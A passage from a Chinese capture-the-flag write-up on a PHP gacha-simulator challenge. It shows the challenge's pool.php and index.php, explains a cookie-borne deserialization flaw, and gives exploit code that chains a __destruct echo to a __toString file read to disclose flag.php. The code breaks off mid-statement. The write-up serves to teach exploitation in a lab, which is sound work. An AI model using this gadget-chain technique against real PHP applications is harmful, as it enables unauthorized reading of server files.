span><span></span><span></span><span></span></span></code></pre><p>pool.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token number">3</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token comment">//%42</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"kokodayo~"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"狙击"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"泡普卡"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"近卫"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"炎熔"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"术士"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"斑点"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"重装"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"香草"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"先锋"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"粉毛猛男"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"医疗"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"翎羽"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"先锋"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"泡普卡"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"近卫"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"卡缇"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"重装"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"米格鲁"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"重装"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"安德切尔"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"狙击"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"芙蓉"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"医疗"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"梓兰"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"特种"</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token number">4</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token comment">//%48</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"NTR"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"重装"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"孑哥"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"特种"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"流泪富婆猫猫头"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"狙击"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"你滴龟神"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"重装"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"某法国干员"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"先锋"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"某暴力医生"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"医疗"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"台词烫嘴"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"特种"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"FF0"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"医疗"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token number">5</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token comment">//%8</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"玫剑圣"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"近卫"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"不准你休息的驴"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"术士/近卫"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"德克萨斯"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"先锋"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"德克萨斯做得到吗"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"近卫"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span> <span class="token punctuation">,</span>        <span class="token number">6</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token comment">//%2</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"r4u的女朋友夕"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"术士"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"r4u的老婆年"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"重装"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"花泽香菜"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"重装"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"推王"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"先锋"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"蒂蒂"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"近卫"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"小羊"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"术士"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"★★★★★★"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"银老板"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=></span><span class="token string double-quoted-string">"近卫"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php:</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phperror_reporting(0);require_once (&quot;simulator.php&quot;);$simulator &#x3D; new Simulator();$cards &#x3D; array();if(isset($_POST[&quot;draw&quot;]))&#123;    $cards &#x3D; $simulator-&gt;draw($_POST[&quot;draw&quot;]);&#125;?&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;title&gt;Arknights&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;    &lt;link href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;cover.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;&lt;&#x2F;head&gt;&lt;body class&#x3D;&quot;text-center&quot;&gt;    &lt;div class&#x3D;&quot;d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;        &lt;header class&#x3D;&quot;mastfoot mt-auto&quot;&gt;            &lt;h1&gt;非酋证明器&lt;&#x2F;h1&gt;            &lt;br&gt;            &lt;br&gt;        &lt;&#x2F;header&gt;        &lt;main style&#x3D;&quot;height: 85%&quot;&gt;        &lt;div class&#x3D;&quot;card own&quot;&gt;            &lt;h5 class&#x3D;&quot;card-header&quot; style&#x3D;&quot;color: blue&quot;&gt;抽中的六星干员&lt;&#x2F;h5&gt;            &lt;div class&#x3D;&quot;card-body&quot;&gt;                &lt;?php                    $legendary &#x3D; $simulator-&gt;getLegendary();                    foreach ($legendary as $worker)&#123;                        echo &quot;&lt;p class&#x3D;&#39;legendary&#39;&gt;&quot;.$worker[&quot;type&quot;].&quot; &quot;.$worker[&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;                    &#125;                ?&gt;            &lt;&#x2F;div&gt;        &lt;&#x2F;div&gt;        &lt;div class&#x3D;&quot;card col-md-3&quot; style&#x3D;&quot;color: #007bff;width&#x3D;100%;&quot;&gt;            &lt;h5 class&#x3D;&quot;card-header&quot;&gt;刀客塔，你要老婆不要？&lt;&#x2F;h5&gt;            &lt;div class&#x3D;&quot;card-body&quot;&gt;                &lt;?php                if(!empty($cards))&#123;                    echo &quot;&lt;h5 class&#x3D;\&quot;card-title\&quot;&gt;抽卡结果：&lt;&#x2F;h5&gt;&quot;;                    echo &quot;&lt;br&gt;&quot;;                &#125;                foreach ($cards as $card)&#123;                    switch ($card[&quot;stars&quot;])&#123;                        case 3:                            echo &quot;&lt;p class&#x3D;&#39;normal&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;                            break;                        case 4:                            echo &quot;&lt;p class&#x3D;&#39;rare&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;                            break;                        case 5:                            echo &quot;&lt;p class&#x3D;&#39;epic&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;                            break;                        case 6:                            echo &quot;&lt;p class&#x3D;&#39;legendary&#39;&gt;&quot;.$card[&quot;card&quot;][&quot;star&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;type&quot;].&quot; &quot;.$card[&quot;card&quot;][&quot;name&quot;].&quot;&lt;&#x2F;p&gt;&quot;;                            break;                    &#125;                &#125;                ?&gt;                &lt;br&gt;                &lt;hr&gt;                &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;&quot;&gt;                    &lt;button class&#x3D;&quot;btn btn-primary&quot; name&#x3D;&quot;draw&quot; value&#x3D;&quot;1&quot;&gt;抽一次&lt;&#x2F;button&gt;                    &lt;button class&#x3D;&quot;btn btn-primary&quot; name&#x3D;&quot;draw&quot; value&#x3D;&quot;10&quot;&gt;连连连连连连连连连连!&lt;&#x2F;button&gt;                &lt;&#x2F;form&gt;            &lt;&#x2F;div&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;main&gt;    &lt;footer class&#x3D;&quot;mastfoot mt-auto&quot;&gt;        &lt;p&gt;Made by 109发抽不到&lt;del&gt;老婆&lt;&#x2F;del&gt;夕的&lt;b&gt;R4u&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;    &lt;&#x2F;footer&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先index.php主要就是包含了simulator.php文件，重点就在simulator.php文件里，pool.php主要是一个英雄池不用管了。simulator.php里看来一遍，可以在Session类的save()和extract()函数处，发现一个存在的序列化和反序列化利用点，并且可以发现Cookie的生成方式,这里就不赘述了，利用反序列的数据也是通过cookie传递。那么接着看看有没有可以被我们利用的其他类，发现了CardsPool类中有一个<code>__toString()</code>方法，方法中使用了<code>file_get_content()</code>函数，这里就可以用于读取文件，而我们的目的就是读取web根目录下的flag.php文件，所以我们这里考虑一下通过触发__toString()的方法。看到最后一个类Eeeeeeevallllllll，它会向屏幕打印信息，所以只要我们把CardsPool对象当作Eeeeeeevallllllll对象的一个成员msg，就可以触发<code>__toString()</code>方法，读取flag.php了。</p><p>exp：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">CardsPool</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cards</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cards pool file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">>=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">42</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">>=</span> <span class="token number">43</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">>=</span> <span class="token number">91</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$rand</span> <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$rand</span> <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$rand_key</span> <span class="token operator">=</span> <span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token variable">$level</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"stars"</span> <span class="token operator">=></span> <span class="token variable">$level</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"No"</span> <span class="token operator">=></span> <span class="token variable">$rand_key</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"card"</span> <span class="token operator">=></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cards</span><span class="token punctuation">[</span><span class="token variable">$level</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$rand_key</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cards</span> <span class="token operator">=</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Eeeeeeevallllllll</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Eeeeeeevallllllll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">msg</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CardsPool</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$se</span> <span class="token operator">=</span> 